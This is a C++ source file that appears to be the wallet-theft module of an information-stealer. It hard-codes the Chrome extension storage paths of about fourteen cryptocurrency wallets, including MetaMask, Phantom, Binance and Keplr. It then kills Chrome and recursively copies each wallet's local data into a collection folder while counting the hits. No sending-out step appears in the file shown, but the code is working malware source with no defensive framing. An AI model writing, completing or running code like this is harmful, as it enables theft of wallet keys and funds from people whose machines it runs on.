#include "ChromExtensions.h"
#include "Paths.h"
#include "Counter.h"
#include "Filemanager.h"
#include <iostream>

// Define a macro to suppress deprecation warnings for experimental filesystem library usage.
// This is used because the experimental filesystem API is being replaced by the standard filesystem library in newer C++ versions.
#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING

// Include the experimental filesystem library header.
#include <experimental/filesystem>

// Create a namespace alias for easier reference to the experimental filesystem namespace.
namespace fs = std::experimental::filesystem;

// Declare a static list of Chrome extension directories and their corresponding wallet extensions.
// Each entry maps a wallet's name (key) to the directory path (value) relative to the user's Local AppData.
std::vector<std::pair<std::string, std::string>> ChromExtensions::ChromeWalletsDirectories = {

    // Each wallet is identified by a specific directory path.
    {"Chrome_Binance",   "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},
    {"Chrome_Coin98",    "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"},
    {"Chrome_Mobox",     "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"},
    {"Chrome_Phantom",   "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},
    {"Chrome_Tron",      "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"},
    {"Chrome_XinPay",    "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"},
    {"Chrome_Ton",       "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"},
    {"Chrome_Metamask",  "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
    {"Chrome_Starcoin",  "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"},
    {"Chrome_Swash",     "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"},
    {"Chrome_Finnie",    "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"},
    {"Chrome_Keplr",     "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"},
    {"Chrome_Liquality", "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"},
    {"Chrome_Liquality", "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"}

};

// Function to copy a wallet directory to a target directory.
// Parameters:
// - sSaveDir: Path to save the wallet.
// - sWalletDir: Path to the source wallet directory.
// - sWalletName: Name of the wallet being copied.
void ChromExtensions::CopyWalletFromDirectoryTo(std::string& sSaveDir, std::string& sWalletDir, std::string& sWalletName)
{
    // Construct the full save path for the wallet by appending the wallet name to the save directory path.
    std::string sdir = sSaveDir + "\\" + sWalletName;

    // Check if the source wallet directory exists. If not, exit the function.
    if (!fs::exists(sWalletDir))
    {
        return;
    }

    // Terminate any running Chrome processes to avoid file conflicts during copying.
    Filemanager::killprocess("chrome.exe");

    // Recursively copy the wallet directory to the target save directory.
    fs::copy(sWalletDir, sdir, fs::copy_options::recursive);

    // Increment the count of successfully copied browser wallets.
    Counter::BrowserWallets++;
}

// Function to retrieve and copy Chrome wallet directories.
// Parameters:
// - sSaveDir: The base directory where wallet copies will be saved.
void ChromExtensions::GetChromeWallets(std::string& sSaveDir)
{
    try
    {
        // Ensure the save directory exists by creating it if necessary.
        fs::create_directories(sSaveDir);

        // Iterate through the list of wallet directories.
        for (auto& dir : ChromeWalletsDirectories)
        {
            // Prepend the user's Local AppData path to the wallet directory path.
            dir.second = Paths::Lappdata + dir.second;

            // Attempt to copy the wallet from the source directory to the save directory.
            CopyWalletFromDirectoryTo(sSaveDir, dir.second, dir.first);
        }

        // If no wallets were successfully copied, delete the save directory to clean up.
        if (Counter::BrowserWallets == 0)
        {
            fs::remove_all(sSaveDir);
        }
    }
    catch (const fs::filesystem_error& e)
    {
        // Log any filesystem errors that occur during wallet retrieval.
        std::cout << "GetChromeWallets: " << e.what() << std::endl;
    }
}
